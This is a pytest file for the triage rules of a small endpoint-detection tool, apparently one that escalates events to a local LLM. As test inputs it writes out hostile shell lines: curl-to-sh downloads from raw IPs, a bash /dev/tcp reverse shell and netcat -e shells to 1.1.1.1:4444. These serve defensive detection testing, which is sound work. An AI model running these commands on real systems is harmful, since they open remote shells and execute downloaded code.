"""Tests for the deterministic triage.

What matters here is not only that the rules fire, but above all that they do
**not** fire on ordinary activity. A triage that over-escalates puts the system
back where it started: the prompt fills with noise and the model reasons worse,
not better.

The benign cases come from activity measured on this machine, not invented: VS
Code polling `git`, Docker launching `runc`, and requests to Ollama on
127.0.0.1:11434.
"""

import pytest

from edr import config, triage


def ev(filename, cmdline="", kind=None):
    return {"filename": filename, "cmdline": cmdline,
            "kind": kind or config.KIND_EXECVE}


# ── Ordinary activity: must not escalate ───────────────────────

@pytest.mark.parametrize("event", [
    ev("/usr/bin/grep", "-r foo"),
    ev("/usr/bin/git", "status --porcelain"),
    ev("/usr/bin/runc", "--root /var/run/docker/runtime-runc/moby"),
    ev("/usr/bin/curl", "-s https://api.github.com/health"),
    ev("/bin/sh", "-c ls -la"),
    ev("/usr/bin/python3", "orchestrator.py"),
])
def test_ordinary_activity_does_not_escalate(event):
    assert not triage.should_escalate(event)


def test_a_request_to_our_own_infrastructure_does_not_escalate():
    """Regression: a raw IP is a signal, but 127.0.0.1 is Ollama.

    The naive version of the rule — "URL with a literal IP" — would fire on
    every request the EDR makes to its own model. The address must also be
    routable on the internet.
    """
    assert not triage.should_escalate(
        ev("/usr/bin/curl", "-s http://127.0.0.1:11434/api/tags"))
    assert not triage.should_escalate(
        ev("/usr/bin/wget", "-q http://192.168.1.10/package.deb"))


def test_documentation_addresses_do_not_count_either():
    """`is_global` also excludes the RFC 5737 reserved ranges.

    Worth remembering when building a demo: the textbook example address
    (198.51.100.x) does NOT fire the rule, a real one is needed.
    """
    assert not triage.should_escalate(
        ev("/usr/bin/curl", "-s http://198.51.100.7/x.sh"))


def test_an_empty_event_does_not_escalate():
    assert triage.assess({}) == (0, [])
    assert triage.assess({"filename": "", "cmdline": ""}) == (0, [])


# ── Each rule on its own ───────────────────────────────────────

def test_execution_from_a_world_writable_directory():
    for path in ("/tmp/x", "/var/tmp/x", "/dev/shm/x", "/run/shm/x"):
        _, rules = triage.assess(ev(path))
        assert "exec_from_world_writable" in rules, path


def test_hidden_binary():
    _, rules = triage.assess(ev("/home/ivan/.cache/.x"))
    assert "hidden_binary" in rules

    # A hidden directory in the path does not count: the binary is what matters.
    _, rules = triage.assess(ev("/home/ivan/.local/bin/tool"))
    assert "hidden_binary" not in rules


def test_pipe_to_shell():
    for command in ("-c curl http://x/y | sh",
                    "-c wget -O - http://x/y|bash",
                    "-c cat x | /bin/sh"):
        _, rules = triage.assess(ev("/bin/bash", command))
        assert "pipe_to_shell" in rules, command


def test_download_piped_straight_into_a_shell():
    _, rules = triage.assess(ev("/bin/bash", "-c curl -s http://x/y.sh | sh"))
    assert "downloader_to_shell" in rules


def test_download_from_a_raw_public_ip():
    _, rules = triage.assess(ev("/usr/bin/curl", "-s http://1.1.1.1/x.sh"))
    assert "download_from_public_ip" in rules

    # A domain name is not a signal: it is the normal case.
    _, rules = triage.assess(ev("/usr/bin/curl", "-s http://example.com/x.sh"))
    assert "download_from_public_ip" not in rules


def test_shell_redirected_to_a_socket():
    """The canonical bash reverse shell, without external tools."""
    _, rules = triage.assess(
        ev("/bin/bash", "-c bash -i >& /dev/tcp/1.1.1.1/4444 0>&1"))
    assert "shell_net_redirect" in rules


def test_netcat_executing_a_program():
    for command in ("-e /bin/sh 1.1.1.1 4444", "-lvnp 4444 -e /bin/bash"):
        _, rules = triage.assess(ev("/usr/bin/nc", command))
        assert "netcat_exec" in rules, command

    # Plain netcat is a legitimate diagnostic tool.
    _, rules = triage.assess(ev("/usr/bin/nc", "-z 127.0.0.1 22"))
    assert "netcat_exec" not in rules


# ── The threshold: one weak signal is not enough, two are ──────

def test_one_weak_signal_does_not_reach_the_threshold():
    """Building or running something in /tmp is ordinary and must not wake the model."""
    severity, rules = triage.assess(ev("/tmp/build.sh"))
    assert rules == ["exec_from_world_writable"]
    assert severity < config.TRIAGE_THRESHOLD


def test_two_weak_signals_do_reach_the_threshold():
    """Running something from /tmp whose name starts with a dot is not ordinary."""
    severity, rules = triage.assess(ev("/tmp/.systemd-update", "600"))
    assert set(rules) == {"exec_from_world_writable", "hidden_binary"}
    assert severity >= config.TRIAGE_THRESHOLD


def test_the_two_demo_commands_land_on_opposite_sides():
    """Without the command line they produce the same event; with it they don't."""
    benign = ev("/usr/bin/curl", "-s https://api.github.com/health")
    malicious = ev("/bin/bash", "-c curl -s http://1.1.1.1/x.sh | sh")

    assert not triage.should_escalate(benign)
    assert triage.should_escalate(malicious)


def test_the_threshold_can_be_moved_without_touching_code():
    event = ev("/tmp/build.sh")
    assert not triage.should_escalate(event)
    assert triage.should_escalate(event, threshold=10)


# ── Alert filtering ────────────────────────────────────────────

def test_a_module_load_is_always_an_alert():
    """Privileged, rare, and the case the system already handled."""
    assert triage.is_alert({"kind": config.KIND_MODULE_LOAD, "comm": "modprobe"})


def test_an_execve_is_only_an_alert_above_the_threshold():
    assert triage.is_alert(
        {"kind": config.KIND_EXECVE, "severity": 70})
    assert not triage.is_alert(
        {"kind": config.KIND_EXECVE, "severity": 40})


def test_an_execve_without_severity_is_scored_on_the_fly():
    """Safety net for events that never went through the sensor."""
    assert triage.is_alert(ev("/tmp/.systemd-update", "600"))
    assert not triage.is_alert(ev("/usr/bin/grep", "-r foo"))


def test_an_unknown_event_kind_is_not_an_alert():
    """Phase 4 sensors will have to declare themselves here explicitly."""
    assert not triage.is_alert({"kind": "future_sensor", "pid": 1})


# ── Slug stability ─────────────────────────────────────────────

def test_every_rule_has_a_declared_weight():
    """A slug with no weight would blow up on sum, and slugs feed the lab stats."""
    emitted = set()
    for event in (ev("/tmp/.x", "-c curl http://1.1.1.1/y | sh"),
                  ev("/usr/bin/nc", "-e /bin/sh 1.1.1.1 4444"),
                  ev("/bin/bash", "-c bash -i >& /dev/tcp/1.1.1.1/4444")):
        emitted.update(triage.assess(event)[1])

    assert emitted <= set(triage.WEIGHTS)
    assert emitted, "the test cases should fire something"
